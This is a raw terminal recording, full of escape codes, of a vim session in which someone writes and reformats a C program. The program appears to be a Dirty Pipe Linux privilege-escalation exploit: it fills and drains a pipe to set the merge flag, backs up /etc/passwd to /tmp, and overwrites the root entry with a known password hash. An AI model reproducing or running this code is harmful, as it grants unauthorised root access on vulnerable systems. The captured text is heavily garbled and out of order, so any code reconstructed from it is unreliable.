strlen(data);[23;1H[1m@@[0m[23;65H[K[23;3H[1m@[0m[24;63H[K[24;63H75,1-8[8C49%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[2;25Hprintf("Setting root password to \"aaron\"...\n");[24;63H[K[24;63H74,1-8[8C49%[6;8H[24;53H~@k[6;8H[24;53H   [8;1H[1;23r[1;1H[3L[1;24r[2;17Hconst char *const data = ":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:tt[3;1Hest:/root:/bin/sh\n"; // openssl passwd -1 -salt aaron aaron[24;63H[K[24;63H73,0-1[8C48%[8;1H[24;53H~@k[8;1H[24;53H   [6;8H[24;64H2,1-8[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[2;9Hloff_t offset = 4; // after the "root"[23;1H[1m@@@[0m[24;63H[K[24;63H71,1-8[8C47%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[3L[1;24r[2;1Hfclose(f2);[23;1H[1m@@@[0m[24;63H[K[24;63H70,1-8[8C46%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[1;73Hfclose(ff[2;1H1);[24;63H[K[24;63H69,1-8[8C46%[6;8H[24;53H~@k[6;8H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[23;1H[1m@@@[0m[24;63H[K[24;63H68,0-1[8C45%[6;1H[24;53H~@k[6;1H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[2;5Hfputc(c, f2);[24;63H[K[24;63H67,1-8[8C45%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[1;65Hwhile ((c = fgett[2;1Hc(f1)) != EOF)[23;1H[1m@@@[0m[24;63H[K[24;63H66,1-8[8C44%[6;8H[24;53H~@k[6;8H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;57Hchar c;[24;63H[K[24;63H65,0-1[8C43%[6;1H[24;53H~@k[6;1H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[2;61H}[24;63H[K[24;63H64,1-8[8C42%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[2;53Hexit(EXIT_FAILURE);[24;63H[K[24;63H63,1-8[8C41%[7;8H[24;53H~@k[7;8H[24;53H   [6;8H[24;64H2[6;8H[24;53H~@k[6;8H[24;53H   [7;1H[1;23r[1;1H[2L[1;24r[2;41Hfclose(f1);[24;63H[K[24;63H61,0-1[8C41%[7;1H[24;53H~@k[7;1H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[2;29Hprintf("Failed to open /tmp/passwd.bak\n");[23;1H[1m@@@[0m[24;63H[K[24;63H60,1-8[8C40%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[2;9H} else if (f2 == NULL) {[23;1H[1m@@@[0m[24;63H[K[24;63H59,1-8[8C39%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[2;1Hexit(EXIT_FAILURE);[24;63H[K[24;63H58,1-8[8C38%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[1;69Hprintf("Faill[2;1Hed to open /etc/passwd\n");[24;63H[K[24;63H57,1-8[8C38%[7;8H[24;53H~@k[7;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[1;49Hif (f1 == NULL) {[23;1H[1m@@[0m[23;73H[K[23;3H[1m@[0m[24;63H[K[24;63H56,1-8[8C37%[6;8H[24;53H~@k[6;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[1;41HFILE *f2 = fopen("/tmp/passwd.bak", "w"))[2;1H;[23;1H[1m@@@[0m[24;63H[K[24;63H55,1-8[8C35%[7;8H[24;53H~@k[7;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[1;33HFILE *f1 = fopen("/etc/passwd", "r");[24;63H[K[24;63H54,1-8[8C35%[6;8H[24;53H~@k[6;8H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[1;25Hprintf("Backing up /etc/passwd to /tmp/passwd.bak ...\n""[2;1H);[24;63H[K[24;63H53,1-8[8C34%[7;8H[24;53H~@k[7;8H[24;53H   [6;1H[24;64H2,0-1[6;1H[24;53H~@k[6;1H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[1;17Hconst char *const path = "/etc/passwd";[24;63H[K[24;63H51,1-8[8C33%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[1;1Hint main() {[23;1H[1m@@@[0m[24;63H[K[24;63H50,1-8[8C32%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[1;1H}[23;1H[1m@@@[0m[24;63H[K[24;63H49,1-8[8C31%[6;8H[24;53H~@k[6;8H[24;53H   [7;1H[1;23r[1;1H[2L[1;24r[1;58H*[17Cwill  [2;1Hbe mergeable */[23;1H[1m@@@[0m[24;63H[K[24;63H48,0-1[8C30%[7;1H[24;53H~@k[7;1H[24;53H   [6;8H[24;64H7,1-8[6;8H[24;53H~@k[6;8H[24;53H   [7;1H[1;23r[1;1H[2L[1;24r[1;58H*[9Cpipe_buffer ww[2;1Hithout initializing its "flags", the buffer[23;1H[1m@@@[0m[24;63H[K[24;63H46,1[10C29%[7;1H[24;53H~@k[7;1H[24;53H   [6;1H[24;64H5,0-1[6;1H[24;53H~@k[6;1H[24;53H   [7;1H[1;23r[1;1H[2L[1;24r[1;57H/* the pipe is now emptyy[2;1H, and if somebody adds a new[23;1H[1m@@@[0m[24;63H[K[24;63H44,1[10C29%[7;1H[24;53H~@k[7;1H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[24;63H[K[24;63H43,1-8[8C28%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[2;33H}[24;63H[K[24;63H42,1-8[8C27%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[2;25Hr -= n;[24;63H[K[24;63H41,1-8[8C27%[6;8H[24;53H~@k[6;8H[24;53H   [7;1H[1;23r[1;1H[2L[1;24r[2;9Hread(p[0], buffer, n);[24;63H[K[24;63H40,0-1[8C26%[7;1H[24;53H~@k[7;1H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[1;73Hunsignedd[2;1H n = r > sizeof(buffer) ? sizeof(buffer) : r;[24;63H[K[24;63H39,1-8[8C25%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[1;49Hfor (unsigned r = pipe_size; r >>[2;1H 0;) {[23;1H[1m@@[0m[23;25H[K[23;3H[1m@[0m[24;63H[K[24;63H38,1-8[8C24%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[1;50H*[9Cleaving the flags inii[2;1Htialized) */[24;63H[K[24;63H37,1-8[8C23%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[1;49H/* drain the pipe, freeing all pp[2;1Hipe_buffer instances (but[24;63H[K[24;63H36,1-8[8C23%[7;8H[24;53H~@k[7;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[24;63H[K[24;63H35,1-8[8C22%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[2;25H}[23;1H[1m@@[0m[23;58H[K[23;3H[1m@[0m[24;63H[K[24;63H34,1-8[8C21%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[2;17Hr -= n;[23;1H[1m@@[0m[23;58H[K[23;3H[1m@[0m[24;63H[K[24;63H33,1-8[8C20%[6;8H[24;53H~@k[6;8H[24;53H   [7;1H[1;23r[1;1H[2L[1;24r[2;1Hwrite(p[1], buffer, n);[23;1H[1m@@[0m[23;57H[K[23;3H[1m@[0m[24;63H[K[24;63H32,0-1[8C20%[7;1H[24;53H~@k[7;1H[24;53H   [7;8H[1;23r[1;1H[2L[1;24r[1;65Hunsigned n = r >>[2;1H sizeof(buffer) ? sizeof(buffer) : r;[24;63H[K[24;63H31,1-8[8C19%[7;8H[24;53H~@k[7;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[1;41Hfor (unsigned r = pipe_size; r > 0;) {[23;1H[1m@@@[0m[24;63H[K[24;63H30,1-8[8C18%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[1;42H*[9Cthe PIPE_BUF_FLAG_CAN_MERGE ff[2;1Hlag */[23;1H[1m@@@[0m[24;63H[K[24;63H29,1-8[8C17%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[1;41H/* fill the pipe completely; each pipe_bb[2;1Huffer will now have[23;1H[1m@@@[0m[24;63H[K[24;63H28,1-8[8C17%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[24;63H[K[24;63H27,1-8[8C16%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[1;25Hconst unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);[2;33Hstatic char buffer[4096];[24;63H[K[24;63H26,1-8[8C15%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[1;17Hif (pipe(p)) abort();[24;63H[K[24;63H25,1-8[8C13%[6;8H[24;53H~@k[6;8H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H{[23;1H[1m@@[0m[23;50H[K[23;3H[1m@[0m[24;63H[K[24;63H24,0-1[8C13%[6;1H[24;53H~@k[6;1H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[1;1Hstatic void prepare_pipe(int p[2])[24;63H[K[24;63H23,1-8[8C12%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[1;2H*    */[23;1H[1m@@[0m[23;49H[K[23;3H[1m@[0m[24;63H[K[24;63H22,1-8[8C11%[6;8H[24;53H~@k[6;8H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;2H*   * PIPE_BUF_FLAG_CAN_MERGE flag set.[24;63H[K[24;63H21,0-1[8C11%[6;1H[24;53H~@k[6;1H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[1;2H*  * Create a pipe where all "bufs" on the pipe_inode_info ring have the[24;63H[K[24;63H20,1-8[8C10%[6;8H[24;53H~@k[6;8H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H/**[23;1H[1m@@@[0m[24;63H[K[24;63H19,1[11C9%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[24;63H[K[24;63H18,1[11C8%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#endif[23;1H[1m@@@[0m[24;63H[K[24;63H17,1[11C8%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#define PAGE_SIZE 4096[24;63H[K[24;63H16,1[11C7%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#ifndef PAGE_SIZE[23;1H[1m@@@[0m[24;63H[K[24;63H15,1[11C6%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[24;63H[K[24;63H14,1[11C6%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#include <sys/user.h>[23;1H[1m@@[0m[23;65H[K[23;3H[1m@[0m[24;63H[K[24;63H13,0-1[9C5%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#include <sys/stat.h>[24;63H[K[24;63H12,1[11C4%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#include <string.h>[24;63H[K[24;63H11,1[11C3%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#include <stdlib.h>[23;1H[1m@@[0m[23;42H[K[23;3H[1m@[0m[24;63H[K[24;63H10,1[11C3%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#include <stdio.h>[24;63H[K[24;63H9,0-1[10C2%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#include <fcntl.h>[23;1H[1m@@[0m[23;41H[K[23;3H[1m@[0m[24;63H[K[24;63H8,1[12C1%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1H#include <unistd.h>[24;63H[K[24;63H7,1[12C0%[6;1H[24;53H~@k[6;1H[24;53H   [6;1H[1;23r[1;1H[L[1;24r[1;1HOURCE[24;63H[K[24;63H6,1[11CTop[6;1H[24;53H~@k[6;1H[24;53H   [5;1H[24;63H5[5;1H[24;53H~@k[5;1H[24;53H   [4;1H[24;63H4[4;1H[24;53H~@k[4;1H[24;53H   [3;1H[24;63H3[3;1H[24;53H~@k[3;1H[24;53H   [2;1H[24;63H2[2;1H[24;53H~@k[2;1H[24;53H   [1;1H[24;63H1[1;1H[24;53H~@k[1;1H[24;53H   [1;1H[24;53H~@k[1;1H[24;53H   [2;1H[24;63H2[2;1H[24;53H~@k[2;1H[24;53H   [1;1H[24;63H1[1;1H[24;53Hi[1;1H[24;53H [1;1H[24;1H[1m-- INSERT --[0m[24;63H[K[24;63H1,1[11CTop[1;1H#OURCE[24;65H2[1;2HdOURCE[24;65H3[1;3HeOURCE[24;65H4[1;4HfOURCE[24;65H5[1;5HiOURCE[24;65H6[1;6HnOURCE[24;65H7[1;7HdOURCE[24;65H8[1;8HOURCE[1;12H[K[24;65H7[1;7HeOURCE[24;65H8[1;8H OURCE[24;65H9[1;9HOURCE[1;13H[K[24;65H8[1;8H_OURCE[24;65H9[1;9H OURCE[24;65H10[1;10HOURCE[1;14H[K[24;65H9 [1;9HOURCE[1;13H[K[24;65H8[1;8H OURCE[24;65H9[1;9H_OURCE[24;65H10[1;10HGOURCE[24;66H1[1;11HNOURCE[24;66H2[1;12HUOURCE[24;66H3[1;13H_OURCE[24;66H4[1;14HSOURCE[24;66H5[1;15H[24;63H2[2;15H[24;63H3[3;15H[24;63H4[4;15H[24;63H5[5;15H[24;63H6[6;15H[24;63H7[7;15H[24;63H8[8;15H[24;63H9,1 [9;1H[24;63H10,15[10;15H[24;64H1[11;15H[24;64H2,7 [12;7H[24;64H3,1[13;1H[24;64H4,4[14;4H[24;64H5,15[15;15H[24;64H6[16;15H[24;64H7,9 [17;9H[24;64H8,15[18;15H[1;23r[23;1H
[1;24r[24;63H[K[24;63H19,2[11C0%[18;2H[1;23r[1;1H[2M[1;24r[22;41H/* fill the pipe completely; each pipe_bb[23;1Huffer will now have[24;63H[K[24;63H20,2-9[9C2%[17;9H[24;63H19,2  [16;2Hi[24;66H3[16;3H[24;63H20,1[17;1H[24;64H1[18;1H[1;23r[1;1H[2M[1;24r[22;42H*[9Cthe PIPE_BUF_FLAG_CAN_MERGE ff[23;1Hlag */[24;63H[K[24;63H22,1[11C3%[17;1H[24;66H2-9[17;9H[24;64H1,1  [16;1H[24;64H0,2-9[15;9H[24;63H19,3  [14;3H[24;66H2[14;2H[24;66H1[14;1H[24;66H2[14;2H[24;66H3[14;3H[14;2H[K[24;66H2[14;2H[24;66H1[14;1H[24;63H20[15;1H[24;66H2-9[15;9H[24;66H3-17[15;17H[24;66H4-18[15;18H[24;66H5-19[15;19H[24;66H6-20[15;20H[24;66H5-19[15;19H[24;66H4-18[15;18H[24;66H3-17[15;17H[15;9Hif (pipe(p)) abort();[15;30H[K[24;66H2-9 [15;9H[24;64H1,1  [16;1H[24;64H2,2-9[17;9H[24;66H3-17[17;17H[24;66H4-25[17;25H[24;66H5-26[17;26H[24;66H6-27[17;27H[24;66H7-28[17;28H[24;66H8-29[17;29H[24;66H9-30[17;30H[24;66H8-29[17;29H[24;66H7-28[17;28H[24;66H6-27[17;27H[24;66H5-26[17;26H[24;66H4-25[17;25H[17;17Hconst unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);[17;70H[K[24;66H3-17[17;17H[17;9Hconst unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);[17;62H[K[24;66H2-9 [17;9Hconst unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);[17;54H[K[24;66H1  [17;1H[16;23r[23;1H
[1;24r[23;41Hfor (unsigned r = pipe_size; r > 0;) {[24;63H[K[24;63H21,1[11C3%[16;1H[15;30Hconst unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZZ[16;1H);[16;3H[K[24;64H0,23-30[15;30H[15;30H[K[16;1H        const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);[24;64H1,2-9  [16;9H[17;23r[17;1H[L[1;24r[16;9H[K[17;9Hconst unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);[24;63H[K[24;63H22,2-9[9C3%[17;9H[24;64H3[18;9H[24;66H3-17[18;17H[24;66H4-25[18;25H[24;66H5-33[18;33H[24;66H6-34[18;34H[24;66H7-35[18;35H[24;66H8-36[18;36H[24;66H9-37[18;37H[24;66H10-38[18;38H[24;66H9-37 [18;37H[24;66H8-36[18;36H[24;66H7-35[18;35H[24;66H6-34[18;34H[24;66H5-33[18;33H[18;25Hstatic char buffer[4096];[18;50H[K[24;66H4-25[18;25H[18;17Hstatic char buffer[4096];[18;42H[K[24;66H3-17[18;17H[18;9Hstatic char buffer[4096];[18;34H[K[24;66H2-9 [18;9H[1;23r[23;1H
[1;24r[23;41Hfor (unsigned r = pipe_size; r > 0;) {[24;63H[K[24;63H24,1[11C4%[18;1H[1;23r[1;1H[2M[1;24r[22;65Hunsigned n = r >>[23;1H sizeof(buffer) ? sizeof(buffer) : r;[24;63H[K[24;63H25,2-9[9C6%[17;9H[24;66H3-17[17;17H[24;66H4-25[17;25H[24;66H5-33[17;33H[24;66H6-41[17;41H[24;66H7-42[17;42H[24;66H8-43[17;43H[24;66H9-44[17;44H[24;66H10-45[17;45H[24;67H1-46[17;46H[24;67H2-47[17;47H[24;67H3-48[17;48H[24;67H4-49[17;49H[24;67H3-48[17;48H[24;67H2-47[17;47H[24;67H1-46[17;46H[24;67H0-45[17;45H[24;66H9-44 [17;44H[24;66H8-43[17;43H[24;66H7-42[17;42H[24;66H6-41[17;41H[17;33H/* fill the pipe completely; each pipe_buffer wii[18;1Hll now have[18;12H[K[24;66H5-33[17;33H[17;25H/* fill the pipe completely; each pipe_buffer will now hh[18;1Have[18;4H[K[24;66H4-25[17;25H[17;23r[23;1H
[1;24r[17;1H   [13C/* fill the pipe completely; each pipe_buffer will now have[23;1H[1m@@@[0m[24;63H[K[24;63H25,3-17[8C6%[17;17H[17;9H/* fill the pipe completely; each pipe_buffer will now have[17;68H[K[24;66H2-9 [17;9H/* fill the pipe completely; each pipe_buffer will now have[17;60H[K[24;66H1  [17;1Hq/* fill the pipe completely; each pipe_buffer will now have[24;66H2[17;2Hq/* fill the pipe completely; each pipe_buffer will now have[24;66H3[17;3H/* fill the pipe completely; each pipe_buffer will now have[17;61H[K[24;66H2[17;2H/* fill the pipe completely; each pipe_buffer will now have[17;60H[K[24;66H1[17;1H        /* fill the pipe completely; each pipe_buffer will now have[24;66H2-9[17;9H[1;23r[23;1H
[1;24r[22;1H   [76C  [23;1Hwrite(p[1], buffer, n);[24;63H[K[24;63H26,2-9[9C6%[17;9H[24;66H3-17[17;17H[1;23r[1;1H[2M[1;24r[23;17Hr -= n;[24;63H[K[24;63H27,3-17[8C8%[17;17H[1;23r[1;1H[2M[1;24r[23;25H}[24;63H[K[24;63H28,3-17[8C9%[16;17H[24;66H4-25[16;25H[24;64H7[15;25H[24;66H5-33[15;33H[24;66H6-41[15;41H[24;66H7-42[15;42H[[24;53H^[[15;42H[24;55H[[15;42H[24;53H   [15;42Ho[24;66H8-43[15;43H[24;66H7-42[15;42H[24;66H6-41[15;41H[15;33Hfor (unsigned r = pipe_size; r > 0;) {[15;72H[K[24;66H5-33[15;33H[15;25Hfor (unsigned r = pipe_size; r > 0;) {[15;64H[K[24;66H4-25[15;25H[15;17Hfor (unsigned r = pipe_size; r > 0;) {[15;56H[K[24;66H3-17[15;17H[15;9Hfor (unsigned r = pipe_size; r > 0;) {[15;48H[K[24;66H2-9 [15;9H[24;64H8[16;9H[24;66H3-17[16;17H[24;66H4-25[16;25H[24;66H5-33[16;33H[24;66H6-41[16;41H[24;66H7-49[16;49H[24;66H8-57[16;57H[24;66H9-65[16;65H[24;66H10-66[16;66H[24;67H1-67[16;67H[24;67H2-68[16;68H[24;67H3-69[16;69H[24;67H4-70[16;70H[24;67H5-71[16;71H[24;67H6-72[16;72H[24;67H7-73[16;73H[24;67H6-72[16;72H[24;67H5-71[16;71H[24;67H4-70[16;70H[24;67H3-69[16;69H[24;67H2-68[16;68H[24;67H1-67[16;67H[24;67H0-66[16;66H[24;66H9-65 [16;65H[24;66H8-57[16;57H[24;66H9-65[16;65H[16;57Hunsigned n = r > sizeof(([17;1Hbuffer) ? sizeof(buffer) : r;[17;30H[K[24;66H8-57[16;57H[16;49Hunsigned n = r > sizeof(buffer)  [17;1H? sizeof(buffer) : r;[17;22H[K[24;66H7-49[16;49H[16;41Hunsigned n = r > sizeof(buffer) ? sizeoff[17;1H(buffer) : r;[17;14H[K[24;66H6-41[16;41H[16;33Hunsigned n = r > sizeof(buffer) ? sizeof(buffer))[17;1H : r;[17;6H[K[24;66H5-33[16;33H[16;23r[23;1H
[1;24r[16;2H    [19Cunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;[24;63H[K[24;63H28,4-25[8C9%[16;25H[16;17Hunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;[16;70H[K[24;66H3-17[16;17H[16;9Hunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;[16;62H[K[24;66H2-9 [16;9H        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;[24;66H3-17[16;17H[24;64H9[17;17H[24;66H2-9 [17;9H[1;23r[1;1H[2M[1;24r[22;49H/* drain the pipe, freeing all pp[23;1Hipe_buffer instances (but[24;63H[K[24;63H30,2-9[8C11%[17;9H[24;63H29[15;9H[64Cwrite(p[[[16;1H1], buffer, n);[16;16H[K[24;66H1  [15;1H[14;23r[23;1H
[1;24r[14;17Hunsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;            [15;1H               [41Cwrite(p[1], buffer, n);[23;50H*[9Cleaving the flags ini[23;1H[1m@@[0m[23;50H[K[23;3H[1m@[0m[24;63H[K[24;63H28,56-70      11%[14;70H[24;64H9,9-65 [16;65H[24;66H8-57[16;57H[24;66H7-49[16;49H[24;64H8,35-49[14;49H[24;67H6-50[14;50H[24;67H7-51[14;51H[24;64H9,7-49 [16;49H[24;66H8-57[16;57H[24;66H9-65[16;65H[24;64H8,51-65[14;65H[24;67H0-64[14;64H[24;66H49-63[14;63H[24;64H7,40-47[13;47H[24;64H8,49-63[14;63H[24;66H50-64[14;64H[24;67H1-65[14;65H[24;67H2-66[14;66H[24;67H3-67[14;67H[24;67H4-68[14;68H[24;64H9,9-65 [16;65H[24;66H10-73[16;73H[24;67H1-81[17;1H[24;67H0-73[16;73H[24;66H9-65 [16;65H[24;66H8-57[16;57H[24;64H8,43-57[14;57H[24;67H4-58[14;58H[24;67H5-59[14;59H[24;67H6-60[14;60H[24;67H7-61[14;61H[24;67H8-62[14;62H[24;67H9-63[14;63H[24;66H50-64[14;64H[24;67H1-65[14;65H[24;67H2-66[14;66H[24;67H3-67[14;67H[24;67H4-68[14;68H[24;67H5-69[14;69H[24;67H6-70[14;70H[24;67H7-73[14;73H[24;67H8-81[15;1H[24;67H9-89[15;9H[24;66H60-97[15;17H[24;67H1-105[15;25H[24;67H2-113[15;33H[24;67H3-121[15;41H[24;67H4-129[15;49H[24;67H5-137[15;57H[24;67H6-138[15;58H[24;67H7-139[15;59H[24;67H8-140[15;60H[24;67H9-141[15;61H[24;66H70-142[15;62H[24;67H1-143[15;63H[24;67H2-144[15;64H[24;67H3-145[15;65H[24;67H4-146[15;66H[24;67H5-147[15;67H[24;67H6-148[15;68H[24;67H7-149[15;69H[24;67H8-150[15;70H[24;67H9-151[15;71H[24;66H80-152[15;72H[24;67H1-153[15;73H[24;67H0-152[15;72H[24;66H79-151[15;71H[24;67H8-150[15;70H[24;67H7-149[15;69H[24;67H6-148[15;68H[24;67H5-147[15;67H[24;67H4-146[15;66H[24;67H3-145[15;65H[24;67H2-144[15;64H[24;67H1-143[15;63H[24;67H0-142[15;62H[24;66H69-141[15;61H[24;67H8-140[15;60H[24;67H7-139[15;59H[24;67H6-138[15;58H[24;67H5-137[15;57H[15;49Hwrite(p[1], buffer, n);[15;72H[K[24;67H4-129[15;49H[15;41Hwrite(p[1], buffer, n);[15;64H[K[24;67H3-121[15;41H[15;33Hwrite(p[1], buffer, n);[15;56H[K[24;67H2-113[15;33H[15;25Hwrite(p[1], buffer, n);[15;48H[K[24;67H1-105[15;25H[15;17Hwrite(p[1], buffer, n);[15;40H[K[24;67H0-97 [15;17H[15;9Hwrite(p[1], buffer, n);[15;32H[K[24;66H59-89[15;9Hwrite(p[1], buffer, n);[15;24H[K[24;67H8-81[15;1H[14;73Hwrite(p[[[15;1H1], buffer, n);[15;16H[K[24;67H7-73[14;73Hwrite(p[1],,[15;1H buffer, n);[15;13H[K[24;67H6-70[14;70H[24;67H7-71[14;71H[24;67H8-72[14;72H[24;67H9-73[14;73H[24;66H60-74[14;74H[24;67H1-75[14;75H[24;67H2-76[14;76H[24;67H3-77[14;77H[24;67H4-78[14;78H[24;67H5-79[14;79H[24;67H6-80[14;80H[24;67H7-81[15;1H[24;67H8-82[15;2H[24;67H9-83[15;3H[24;66H70-84[15;4H[24;67H1-85[15;5H[24;67H2-86[15;6H[24;67H3-87[15;7H[24;67H4-88[15;8H[24;67H5-89[15;9H[24;67H6-90[15;10H[24;67H7-91[15;11H[24;64H9,12-89[17;9H[1;23r[23;1H
[1;24r[22;1H   [46C*[9Cleaving the flags inii[23;1Htialized) */[24;63H[K[24;63H30,12-89      11%[18;9H[24;63H29[16;9H[24;64H8,77-91[14;11H[24;67H6-90[14;10H[24;67H5-89[14;9H[24;67H4-88[14;8H[24;67H3-87[14;7H[24;67H2-86[14;6H[24;67H1-85[14;5H[24;67H0-84[14;4H[24;66H69-83[14;3H[24;67H8-82[14;2H[24;67H7-81[14;1H[24;67H6-80[13;80H[24;67H5-79[13;79H[24;67H4-78[13;78H[24;67H3-77[13;77H[24;67H2-76[13;76H[24;67H1-75[13;75H[24;67H0-74[13;74H[24;66H59-73[13;73H[24;67H8-72[13;72H[24;67H7-71[13;71H[24;67H6-70[13;70H[24;67H5-69[13;69H[24;67H6-70[13;70H[13;70H[K[14;2H               write(p[1], buffer, n);[24;64H9,3-17 [14;17H[24;63H30[15;17H[63C  [16;1H [7Cr -= n;[16;17H[K[24;66H2-9 [15;9H[71C  [16;1Hr -= n;[16;9H[K[24;66H1  [15;1H[14;23r[23;1H
[1;24r[14;17Hwrite(p[1], buffer, n);[40C  [15;1H       [25Cr -= n;[23;49Hfor (unsigned r = pipe_size; r >[23;1H[1m@@[0m[23;49H[K[23;3H[1m@[0m[24;63H[K[24;63H29,26-40      11%[14;40H[24;63H30,5-33 [16;33H[24;66H4-25[16;25H[24;63H29,11-25[14;25H[24;67H2-26[14;26H[24;67H3-27[14;27H[24;67H4-28[14;28H[24;67H5-29[14;29H[24;67H6-30[14;30H[24;67H7-31[14;31H[24;67H8-32[14;32H[24;67H9-33[14;33H[24;66H20-34[14;34H[24;67H1-35[14;35H[24;67H2-36[14;36H[24;67H3-37[14;37H[24;67H4-38[14;38H[24;67H5-39[14;39H[24;67H6-40[14;40H[24;67H7-41[14;41H[24;67H8-49[14;49H[24;67H9-57[14;57H[24;66H30-65[14;65H[24;67H1-73[14;73H[24;67H2-81[15;1H[24;67H3-89[15;9H[24;67H4-97[15;17H[24;67H5-105[15;25H[24;67H6-113[15;33H[24;67H7-114[15;34H[24;67H6-113[15;33H[15;25Hr -= n;[15;33H[K[24;67H5-105[15;25H[15;17Hr -= n;[15;25H[K[24;67H4-97 [15;17H[15;9Hr -= n;[15;17H[K[24;67H3-89[15;9H        r -= n;[24;67H4-97[15;17H[24;63H30,13[17;17H[24;67H4-105[17;25H[24;67H5-106[17;26H[24;67H4-105[17;25H[17;17H}[17;25H[K[24;67H3-97 [17;17H[17;9H}[17;17H[K[24;67H2-89[17;9H}[17;9H[K[24;67H1-81[17;1H[16;23r[23;1H
[1;24r[16;1H [71C}[22;1H   [45Cfor (unsigned r = pipe_size; r >>[23;1H 0;) {[24;63H[K[24;63H30,10-73      12%[16;73H[16;65H}[16;73H[K[24;66H9-65 [16;65H[16;57H}[16;65H[K[24;66H8-57[16;57H[16;49H}[16;57H[K[24;66H7-49[16;49H[16;41H}[16;49H[K[24;66H6-41[16;41H[16;33H}[16;41H[K[24;66H5-33[16;33H[16;25H}[16;33H[K[24;66H4-25[16;25H[16;17H}[16;25H[K[24;66H3-17[16;17H[16;9H}[16;17H[K[24;66H2-9 [16;9H}[16;9H[K[24;66H1  [16;1H [7C}[24;66H2-9[16;9H[24;64H1,1  [17;1H[1;23r[1;1H[2M[1;24r[22;73Hunsignedd[23;1H n = r > sizeof(buffer) ? sizeof(buffer) : 